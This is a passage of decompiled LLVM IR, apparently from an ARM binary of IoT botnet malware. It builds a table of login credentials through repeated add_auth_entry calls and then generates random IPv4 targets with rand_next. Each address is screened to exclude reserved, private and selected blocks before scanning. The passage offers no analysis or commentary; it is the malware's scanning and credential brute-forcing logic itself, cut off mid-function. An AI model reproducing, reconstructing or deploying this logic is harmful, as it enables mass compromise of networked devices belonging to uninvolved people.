  %v4_e6f0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1a7c0.175 to i32), i32 ptrtoint (i32* @global_var_1a7c8.177 to i32), i32 15)
  store i32 ptrtoint ([8 x i8]* @global_var_1a7c0.175 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7d4.179 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_e700 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1a7c0.175 to i32), i32 ptrtoint (i32* @global_var_1a7d4.179 to i32), i32 15)
  store i32 ptrtoint ([8 x i8]* @global_var_1a7c0.175 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a7e0.181 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_e710 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1a7c0.175 to i32), i32 ptrtoint ([7 x i8]* @global_var_1a7e0.181 to i32), i32 13)
  store i32 ptrtoint ([8 x i8]* @global_var_1a7c0.175 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7ec.171 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_e720 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1a7c0.175 to i32), i32 ptrtoint (i32* @global_var_1a7ec.171 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7e8.183 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a7f0.185 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e730 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7e8.183 to i32), i32 ptrtoint ([6 x i8]* @global_var_1a7f0.185 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7e8.183 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a7f8.187 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e740 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7e8.183 to i32), i32 ptrtoint ([6 x i8]* @global_var_1a7f8.187 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7e8.183 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a800.189 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e750 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7e8.183 to i32), i32 ptrtoint ([9 x i8]* @global_var_1a800.189 to i32), i32 12)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7e8.183 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a80c.191 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_e760 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7e8.183 to i32), i32 ptrtoint ([5 x i8]* @global_var_1a80c.191 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7e8.183 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1a814.193 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_e770 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7e8.183 to i32), i32 ptrtoint ([4 x i8]* @global_var_1a814.193 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7e8.183 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a7e8.183 to i32), i32* %r1.global-to-local, align 4
  %v5_e780 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7e8.183 to i32), i32 ptrtoint ([5 x i8]* @global_var_1a7e8.183 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7e8.183 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a818.195 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_e790 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7e8.183 to i32), i32 ptrtoint ([7 x i8]* @global_var_1a818.195 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7e8.183 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7ec.171 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_e7a0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1a7e8.183 to i32), i32 ptrtoint (i32* @global_var_1a7ec.171 to i32), i32 4)
  store i32 ptrtoint ([8 x i8]* @global_var_1a820.197 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1a820.197 to i32), i32* %r1.global-to-local, align 4
  %v5_e7b0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1a820.197 to i32), i32 ptrtoint ([8 x i8]* @global_var_1a820.197 to i32), i32 14)
  store i32 ptrtoint ([7 x i8]* @global_var_1a828.199 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a830.201 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e7c0 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1a828.199 to i32), i32 ptrtoint ([7 x i8]* @global_var_1a830.201 to i32), i32 12)
  store i32 ptrtoint ([6 x i8]* @global_var_1a838.203 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1a838.203 to i32), i32* %r1.global-to-local, align 4
  %v5_e7d0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a838.203 to i32), i32 ptrtoint ([6 x i8]* @global_var_1a838.203 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_1a838.203 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1a840.205 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e7e0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a838.203 to i32), i32 ptrtoint ([7 x i8]* @global_var_1a840.205 to i32), i32 9)
  store i32 ptrtoint ([6 x i8]* @global_var_1a838.203 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1a848.207 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e7f0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1a838.203 to i32), i32 ptrtoint ([8 x i8]* @global_var_1a848.207 to i32), i32 12)
  store i32 ptrtoint ([4 x i8]* @global_var_1a850.209 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7ec.171 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_e800 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_1a850.209 to i32), i32 ptrtoint (i32* @global_var_1a7ec.171 to i32), i32 3)
  %v2_e808 = ptrtoint i32* %stack_var_-1866 to i32
  store i32 %v2_e808, i32* %r0.global-to-local, align 4
  %v1_10240 = add i32 %v2_e808, 20
  %v1_10294 = add i32 %v2_e808, 16
  %v2_10294 = inttoptr i32 %v1_10294 to i32*
  %v1_102a8 = add i32 %v2_e808, 9
  %v2_102a8 = inttoptr i32 %v1_102a8 to i8*
  %v2_10538 = ptrtoint i32* %stack_var_-40 to i32
  %v2_10584 = ptrtoint i32* %stack_var_-68 to i32
  %v2_10588 = ptrtoint i32* %stack_var_-224 to i32
  %v2_1058c = ptrtoint i32* %stack_var_-352 to i32
  %v2_10eec = ptrtoint i32* %stack_var_-45 to i32
  %v2_10ef4 = ptrtoint i32* %stack_var_-88 to i32
  %v2_10efc = ptrtoint i32* %stack_var_-77 to i32
  %v2_10d7c = ptrtoint i32* %stack_var_-60 to i32
  %v2_11158 = ptrtoint i32* %stack_var_-280 to i32
  %v2_11220 = ptrtoint i32* %stack_var_-96 to i32
  %v2_11270 = ptrtoint i32* %stack_var_-42 to i32
  %v1_10328 = add i32 %v2_e808, 12
  %v2_10328 = inttoptr i32 %v1_10328 to i32*
  br label %dec_label_pc_e810

dec_label_pc_e810:                                ; preds = %dec_label_pc_10720, %dec_label_pc_e5dc
  %v2_e814 = load i32, i32* @global_var_23280.135, align 4
  store i32 %v2_e814, i32* %r1.global-to-local, align 4
  %v0_e818 = load i32, i32* @fp, align 4
  %v3_e818 = icmp uge i32 %v0_e818, %v2_e814
  store i1 %v3_e818, i1* %cpsr_c.global-to-local, align 1
  %v9_e818 = icmp eq i32 %v0_e818, %v2_e814
  store i1 %v9_e818, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e818, label %dec_label_pc_10230, label %dec_label_pc_e824

dec_label_pc_e824:                                ; preds = %dec_label_pc_e810
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  br label %dec_label_pc_e82c

dec_label_pc_e82c:                                ; preds = %dec_label_pc_1014c, %dec_label_pc_e824
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  store i32 0, i32* %stack_var_-88, align 4
  %v0_e840 = call i32 @rand_next()
  %v1_e840 = trunc i32 %v0_e840 to i16
  store i32 %v0_e840, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_25d48.57 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_23250.151 to i32), i32* %r4.global-to-local, align 4
  %v2_e84c = load i32, i32* @global_var_25d48.57, align 4
  store i32 %v2_e84c, i32* %r3.global-to-local, align 4
  store i16 %v1_e840, i16* bitcast (i32* @global_var_23254.156 to i16*), align 4
  store i32 %v2_e84c, i32* @global_var_2325c.210, align 4
  br label %dec_label_pc_e858

dec_label_pc_e858:                                ; preds = %.thread651.thread, %dec_label_pc_e8ec, %dec_label_pc_e8e0, %dec_label_pc_e8d4, %dec_label_pc_e8c8, %dec_label_pc_e8bc, %dec_label_pc_e8b0, %dec_label_pc_e8a4, %dec_label_pc_e898, %dec_label_pc_e88c, %dec_label_pc_e880, %bb1920, %dec_label_pc_10120, %dec_label_pc_100ec, %dec_label_pc_100a8, %bb1892, %dec_label_pc_ffa4, %.thread599, %dec_label_pc_ff30, %dec_label_pc_fef4, %bb1860, %bb1853, %bb1848, %bb1843, %bb1837, %bb1832, %bb1826, %bb1821, %bb1816, %bb1811, %bb1806, %bb1801, %bb1796, %bb1791, %bb1786, %.thread471, %dec_label_pc_fb20, %.thread465, %dec_label_pc_fadc, %.thread459, %dec_label_pc_fab0, %.thread455, %dec_label_pc_fa88, %dec_label_pc_fa78, %.thread450, %.thread446, %.thread442, %.thread438, %bb1774, %bb1767, %bb1762, %bb1754, %bb1748, %bb1741, %bb1736, %bb1731, %bb1726, %bb1721, %bb1716, %.thread365, %bb1708, %bb1704, %bb1701, %bb1695, %bb1687, %bb1684, %bb1680, %bb1672, %bb1665, %bb1660, %bb1657, %bb1653, %bb1649, %bb1641, %bb1634, %bb1629, %bb1624, %bb1622, %bb1618, %bb1611, %dec_label_pc_f3f8, %dec_label_pc_f3e8, %.thread245, %dec_label_pc_f3a8, %.thread239, %.thread235, %dec_label_pc_f350, %dec_label_pc_f334, %.thread228, %.thread224, %.thread220, %dec_label_pc_f024, %dec_label_pc_edf4, %dec_label_pc_ed34, %.thread114, %dec_label_pc_ec50, %dec_label_pc_ec2c, %.thread91, %dec_label_pc_ebac, %dec_label_pc_eb88, %.thread75, %.thread71, %dec_label_pc_eb0c, %dec_label_pc_eac8, %.thread60, %dec_label_pc_ea7c, %dec_label_pc_ea64, %dec_label_pc_ea30, %.thread48, %.thread44, %.thread40, %dec_label_pc_e9e0, %.thread35, %.thread31, %dec_label_pc_e958, %dec_label_pc_e944, %dec_label_pc_e930, %dec_label_pc_10144, %dec_label_pc_10118, %bb1914, %bb1913, %dec_label_pc_100cc, %dec_label_pc_10084, %dec_label_pc_10060, %dec_label_pc_10040, %dec_label_pc_1001c, %bb1887, %dec_label_pc_ff74, %dec_label_pc_ff58, %dec_label_pc_ff14, %dec_label_pc_fed8, %dec_label_pc_feb8, %dec_label_pc_fe94, %bb1854, %bb1827, %bb1802, %bb1782, %bb1781, %bb1776, %bb1775, %bb1742, %bb1711, %bb1635, %bb1597, %dec_label_pc_f2cc, %dec_label_pc_f2a8, %dec_label_pc_f288, %dec_label_pc_f268, %dec_label_pc_f238, %dec_label_pc_f218, %dec_label_pc_f1f8, %dec_label_pc_f1e0, %dec_label_pc_f1b8, %dec_label_pc_f1a0, %dec_label_pc_f180, %dec_label_pc_f15c, %dec_label_pc_f134, %dec_label_pc_f118, %dec_label_pc_f0f8, %bb1408, %bb1401, %bb1398, %bb1395, %bb1386, %bb1383, %dec_label_pc_e8f8, %bb1380, %bb1379, %bb1378, %bb1377, %bb1376, %bb1375, %bb1374, %bb1373, %bb1372, %bb1371, %bb1370, %dec_label_pc_f0d8, %dec_label_pc_f0b8, %dec_label_pc_f098, %dec_label_pc_f084, %dec_label_pc_f060, %dec_label_pc_f040, %dec_label_pc_f008, %dec_label_pc_efec, %dec_label_pc_efd0, %dec_label_pc_efb0, %dec_label_pc_ef9c, %dec_label_pc_ef80, %dec_label_pc_ef5c, %dec_label_pc_ef30, %dec_label_pc_ef04, %dec_label_pc_eed8, %dec_label_pc_eea8, %dec_label_pc_ee84, %dec_label_pc_ee5c, %dec_label_pc_ee40, %dec_label_pc_ee18, %dec_label_pc_edd0, %dec_label_pc_eda4, %dec_label_pc_ed84, %dec_label_pc_ed2c, %dec_label_pc_ecfc, %bb1459, %bb1456, %bb1453, %bb1444, %bb1441, %bb1438, %bb1429, %bb1426, %bb1425, %bb1422, %bb1415, %dec_label_pc_e82c
  %v0_e858 = call i32 @rand_next()
  store i32 %v0_e858, i32* %r0.global-to-local, align 4
  %v1_e85c = urem i32 %v0_e858, 256
  store i32 %v1_e85c, i32* %r1.global-to-local, align 4
  %v3_e860 = udiv i32 %v0_e858, 256
  store i32 %v3_e860, i32* %r3.global-to-local, align 4
  %v3_e864 = udiv i32 %v0_e858, 65536
  store i32 %v3_e864, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e868 = icmp eq i32 %v1_e85c, 0
  store i1 %v2_e868, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e868, label %bb1370, label %bb1369

bb1369:                                           ; preds = %dec_label_pc_e858
  %v3_e86c = icmp ugt i32 %v1_e85c, 126
  store i1 %v3_e86c, i1* %cpsr_c.global-to-local, align 1
  %v8_e86c = icmp eq i32 %v1_e85c, 127
  store i1 %v8_e86c, i1* %cpsr_z.global-to-local, align 1
  br label %bb1370

bb1370:                                           ; preds = %dec_label_pc_e858, %bb1369
  %v0_e87c = phi i1 [ true, %dec_label_pc_e858 ], [ %v8_e86c, %bb1369 ]
  %v1_e870 = urem i32 %v3_e860, 256
  store i32 %v1_e870, i32* %ip.global-to-local, align 4
  %v1_e874 = urem i32 %v3_e864, 256
  store i32 %v1_e874, i32* %r2.global-to-local, align 4
  %v1_e878 = and i32 %v0_e858, 8388608
  %v2_e878 = icmp ne i32 %v1_e878, 0
  store i1 %v2_e878, i1* %cpsr_c.global-to-local, align 1
  %v3_e878 = udiv i32 %v0_e858, 16777216
  store i32 %v3_e878, i32* %r0.global-to-local, align 4
  br i1 %v0_e87c, label %dec_label_pc_e858, label %dec_label_pc_e880

dec_label_pc_e880:                                ; preds = %bb1370
  %v2_e880 = icmp ugt i32 %v1_e85c, 14
  store i1 %v2_e880, i1* %cpsr_c.global-to-local, align 1
  %v7_e880 = icmp eq i32 %v1_e85c, 15
  store i1 %v7_e880, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e880, label %dec_label_pc_e858, label %bb1371

bb1371:                                           ; preds = %dec_label_pc_e880
  %v3_e884 = icmp ugt i32 %v1_e85c, 2
  store i1 %v3_e884, i1* %cpsr_c.global-to-local, align 1
  %v8_e884 = icmp eq i32 %v1_e85c, 3
  store i1 %v8_e884, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e884, label %dec_label_pc_e858, label %dec_label_pc_e88c

dec_label_pc_e88c:                                ; preds = %bb1371
  %v2_e88c = icmp ugt i32 %v1_e85c, 9
  store i1 %v2_e88c, i1* %cpsr_c.global-to-local, align 1
  %v7_e88c = icmp eq i32 %v1_e85c, 10
  store i1 %v7_e88c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e88c, label %dec_label_pc_e858, label %bb1372

bb1372:                                           ; preds = %dec_label_pc_e88c
  %v3_e890 = icmp ugt i32 %v1_e85c, 55
  store i1 %v3_e890, i1* %cpsr_c.global-to-local, align 1
  %v8_e890 = icmp eq i32 %v1_e85c, 56
  store i1 %v8_e890, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e890, label %dec_label_pc_e858, label %dec_label_pc_e898

dec_label_pc_e898:                                ; preds = %bb1372
  %v2_e898 = icmp ugt i32 %v1_e85c, 48
  store i1 %v2_e898, i1* %cpsr_c.global-to-local, align 1
  %v7_e898 = icmp eq i32 %v1_e85c, 49
  store i1 %v7_e898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e898, label %dec_label_pc_e858, label %bb1373

bb1373:                                           ; preds = %dec_label_pc_e898
  %v3_e89c = icmp ugt i32 %v1_e85c, 24
  store i1 %v3_e89c, i1* %cpsr_c.global-to-local, align 1
  %v8_e89c = icmp eq i32 %v1_e85c, 25
  store i1 %v8_e89c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e89c, label %dec_label_pc_e858, label %dec_label_pc_e8a4

dec_label_pc_e8a4:                                ; preds = %bb1373
  %v2_e8a4 = icmp ugt i32 %v1_e85c, 136
  store i1 %v2_e8a4, i1* %cpsr_c.global-to-local, align 1
  %v7_e8a4 = icmp eq i32 %v1_e85c, 137
  store i1 %v7_e8a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8a4, label %dec_label_pc_e858, label %bb1374

bb1374:                                           ; preds = %dec_label_pc_e8a4
  %v3_e8a8 = icmp ugt i32 %v1_e85c, 49
  store i1 %v3_e8a8, i1* %cpsr_c.global-to-local, align 1
  %v8_e8a8 = icmp eq i32 %v1_e85c, 50
  store i1 %v8_e8a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e8a8, label %dec_label_pc_e858, label %dec_label_pc_e8b0

dec_label_pc_e8b0:                                ; preds = %bb1374
  %v2_e8b0 = icmp ugt i32 %v1_e85c, 6
  store i1 %v2_e8b0, i1* %cpsr_c.global-to-local, align 1
  %v7_e8b0 = icmp eq i32 %v1_e85c, 7
  store i1 %v7_e8b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8b0, label %dec_label_pc_e858, label %bb1375

bb1375:                                           ; preds = %dec_label_pc_e8b0
  %v3_e8b4 = icmp ugt i32 %v1_e85c, 5
  store i1 %v3_e8b4, i1* %cpsr_c.global-to-local, align 1
  %v8_e8b4 = icmp eq i32 %v1_e85c, 6
  store i1 %v8_e8b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e8b4, label %dec_label_pc_e858, label %dec_label_pc_e8bc

dec_label_pc_e8bc:                                ; preds = %bb1375
  %v2_e8bc = icmp ugt i32 %v1_e85c, 20
  store i1 %v2_e8bc, i1* %cpsr_c.global-to-local, align 1
  %v7_e8bc = icmp eq i32 %v1_e85c, 21
  store i1 %v7_e8bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8bc, label %dec_label_pc_e858, label %bb1376

bb1376:                                           ; preds = %dec_label_pc_e8bc
  %v3_e8c0 = icmp ugt i32 %v1_e85c, 10
  store i1 %v3_e8c0, i1* %cpsr_c.global-to-local, align 1
  %v8_e8c0 = icmp eq i32 %v1_e85c, 11
  store i1 %v8_e8c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e8c0, label %dec_label_pc_e858, label %dec_label_pc_e8c8

dec_label_pc_e8c8:                                ; preds = %bb1376
  %v2_e8c8 = icmp ugt i32 %v1_e85c, 25
  store i1 %v2_e8c8, i1* %cpsr_c.global-to-local, align 1
  %v7_e8c8 = icmp eq i32 %v1_e85c, 26
  store i1 %v7_e8c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8c8, label %dec_label_pc_e858, label %bb1377

bb1377:                                           ; preds = %dec_label_pc_e8c8
  %v3_e8cc = icmp ugt i32 %v1_e85c, 21
  store i1 %v3_e8cc, i1* %cpsr_c.global-to-local, align 1
  %v8_e8cc = icmp eq i32 %v1_e85c, 22
  store i1 %v8_e8cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e8cc, label %dec_label_pc_e858, label %dec_label_pc_e8d4

dec_label_pc_e8d4:                                ; preds = %bb1377
  %v2_e8d4 = icmp ugt i32 %v1_e85c, 28
  store i1 %v2_e8d4, i1* %cpsr_c.global-to-local, align 1
  %v7_e8d4 = icmp eq i32 %v1_e85c, 29
  store i1 %v7_e8d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8d4, label %dec_label_pc_e858, label %bb1378

bb1378:                                           ; preds = %dec_label_pc_e8d4
  %v3_e8d8 = icmp ugt i32 %v1_e85c, 27
  store i1 %v3_e8d8, i1* %cpsr_c.global-to-local, align 1
  %v8_e8d8 = icmp eq i32 %v1_e85c, 28
  store i1 %v8_e8d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e8d8, label %dec_label_pc_e858, label %dec_label_pc_e8e0

dec_label_pc_e8e0:                                ; preds = %bb1378
  %v2_e8e0 = icmp ugt i32 %v1_e85c, 32
  store i1 %v2_e8e0, i1* %cpsr_c.global-to-local, align 1
  %v7_e8e0 = icmp eq i32 %v1_e85c, 33
  store i1 %v7_e8e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8e0, label %dec_label_pc_e858, label %bb1379

bb1379:                                           ; preds = %dec_label_pc_e8e0
  %v3_e8e4 = icmp ugt i32 %v1_e85c, 29
  store i1 %v3_e8e4, i1* %cpsr_c.global-to-local, align 1
  %v8_e8e4 = icmp eq i32 %v1_e85c, 30
  store i1 %v8_e8e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e8e4, label %dec_label_pc_e858, label %dec_label_pc_e8ec

dec_label_pc_e8ec:                                ; preds = %bb1379
  %v2_e8ec = icmp ugt i32 %v1_e85c, 213
  store i1 %v2_e8ec, i1* %cpsr_c.global-to-local, align 1
  %v7_e8ec = icmp eq i32 %v1_e85c, 214
  store i1 %v7_e8ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8ec, label %dec_label_pc_e858, label %bb1380

bb1380:                                           ; preds = %dec_label_pc_e8ec
  %v3_e8f0 = icmp ugt i32 %v1_e85c, 54
  store i1 %v3_e8f0, i1* %cpsr_c.global-to-local, align 1
  %v8_e8f0 = icmp eq i32 %v1_e85c, 55
  store i1 %v8_e8f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e8f0, label %dec_label_pc_e858, label %dec_label_pc_e8f8

dec_label_pc_e8f8:                                ; preds = %bb1380
  %v2_e8f8 = icmp ugt i32 %v1_e85c, 214
  store i1 %v2_e8f8, i1* %cpsr_c.global-to-local, align 1
  %v7_e8f8 = icmp eq i32 %v1_e85c, 215
  store i1 %v7_e8f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8f8, label %dec_label_pc_e858, label %dec_label_pc_e900

dec_label_pc_e900:                                ; preds = %dec_label_pc_e8f8
  %v7_e900 = icmp eq i32 %v1_e85c, 192
  %.1975 = zext i1 %v7_e900 to i32
  store i32 %.1975, i32* @r5, align 4
  %v2_e90c = icmp ugt i32 %v1_e870, 167
  store i1 %v2_e90c, i1* %cpsr_c.global-to-local, align 1
  %v7_e90c = icmp eq i32 %v1_e870, 168
  store i1 %v7_e90c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e90c, label %bb1383, label %dec_label_pc_e918

bb1383:                                           ; preds = %dec_label_pc_e900
  %v2_e900 = icmp ugt i32 %v1_e85c, 191
  store i1 %v2_e900, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e900, label %dec_label_pc_e858, label %dec_label_pc_e918

dec_label_pc_e918:                                ; preds = %dec_label_pc_e900, %bb1383
  %v7_e918 = icmp eq i32 %v1_e85c, 146
  %.1976 = zext i1 %v7_e918 to i32
  %v2_e924 = icmp ugt i32 %v1_e870, 16
  store i1 %v2_e924, i1* %cpsr_c.global-to-local, align 1
  %v7_e924 = icmp eq i32 %v1_e870, 17
  store i1 %v7_e924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e924, label %bb1386, label %dec_label_pc_e930

bb1386:                                           ; preds = %dec_label_pc_e918
  %v2_e918 = icmp ugt i32 %v1_e85c, 145
  store i1 %v2_e918, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e918, label %dec_label_pc_e858, label %dec_label_pc_e930

dec_label_pc_e930:                                ; preds = %dec_label_pc_e918, %bb1386
  %v2_e930 = icmp ugt i32 %v1_e870, 79
  store i1 %v2_e930, i1* %cpsr_c.global-to-local, align 1
  %v7_e930 = icmp eq i32 %v1_e870, 80
  %.1977 = zext i1 %v7_e930 to i32
  %v2_e93c = and i32 %.1977, %.1976
  %v4_e93c = icmp eq i32 %v2_e93c, 0
  store i1 %v4_e93c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_e93c, label %dec_label_pc_e944, label %dec_label_pc_e858

dec_label_pc_e944:                                ; preds = %dec_label_pc_e930
  %v2_e944 = icmp ugt i32 %v1_e870, 97
  store i1 %v2_e944, i1* %cpsr_c.global-to-local, align 1
  %v7_e944 = icmp eq i32 %v1_e870, 98
  %.1978 = zext i1 %v7_e944 to i32
  store i32 %.1978, i32* @r8, align 4
  %v2_e950 = and i32 %.1978, %.1976
  %v4_e950 = icmp eq i32 %v2_e950, 0
  store i1 %v4_e950, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_e950, label %dec_label_pc_e958, label %dec_label_pc_e858

dec_label_pc_e958:                                ; preds = %dec_label_pc_e944
  %v2_e958 = icmp ugt i32 %v1_e870, 153
  store i1 %v2_e958, i1* %cpsr_c.global-to-local, align 1
  %v7_e958 = icmp eq i32 %v1_e870, 154
  %.1979 = zext i1 %v7_e958 to i32
  %v2_e964 = and i32 %.1979, %.1976
  %v4_e964 = icmp eq i32 %v2_e964, 0
  store i1 %v4_e964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_e964, label %dec_label_pc_e96c, label %dec_label_pc_e858

dec_label_pc_e96c:                                ; preds = %dec_label_pc_e958
  %v7_e96c = icmp eq i32 %v1_e85c, 147
  %.1980 = zext i1 %v7_e96c to i32
  %v2_e978 = icmp ugt i32 %v1_e870, 158
  store i1 %v2_e978, i1* %cpsr_c.global-to-local, align 1
  %v7_e978 = icmp eq i32 %v1_e870, 159
  store i1 %v7_e978, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e978, label %bb1395, label %dec_label_pc_e984

bb1395:                                           ; preds = %dec_label_pc_e96c
  %v2_e96c = icmp ugt i32 %v1_e85c, 146
  store i1 %v2_e96c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e96c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e96c, label %dec_label_pc_e858, label %dec_label_pc_e984

dec_label_pc_e984:                                ; preds = %dec_label_pc_e96c, %bb1395
  %v2_e984 = icmp ugt i32 %v1_e870, 113
  %v7_e984 = icmp eq i32 %v1_e870, 114
  %.1981 = zext i1 %v7_e984 to i32
  %v2_e990 = icmp ugt i32 %v1_e85c, 147
  store i1 %v2_e990, i1* %cpsr_c.global-to-local, align 1
  %v7_e990 = icmp eq i32 %v1_e85c, 148
  store i1 %v7_e990, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e990, label %bb1398, label %dec_label_pc_e9a0

bb1398:                                           ; preds = %dec_label_pc_e984
  store i1 %v2_e984, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e984, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e984, label %dec_label_pc_e858, label %dec_label_pc_e9a0

dec_label_pc_e9a0:                                ; preds = %dec_label_pc_e984, %bb1398
  %v7_e9a0 = icmp eq i32 %v1_e85c, 150
  %.1982 = zext i1 %v7_e9a0 to i32
  store i32 %.1982, i32* %r4.global-to-local, align 4
  %v2_e9ac = icmp ugt i32 %v1_e870, 124
  store i1 %v2_e9ac, i1* %cpsr_c.global-to-local, align 1
  %v7_e9ac = icmp eq i32 %v1_e870, 125
  store i1 %v7_e9ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9ac, label %bb1401, label %dec_label_pc_e9b8

bb1401:                                           ; preds = %dec_label_pc_e9a0
  %v2_e9a0 = icmp ugt i32 %v1_e85c, 149
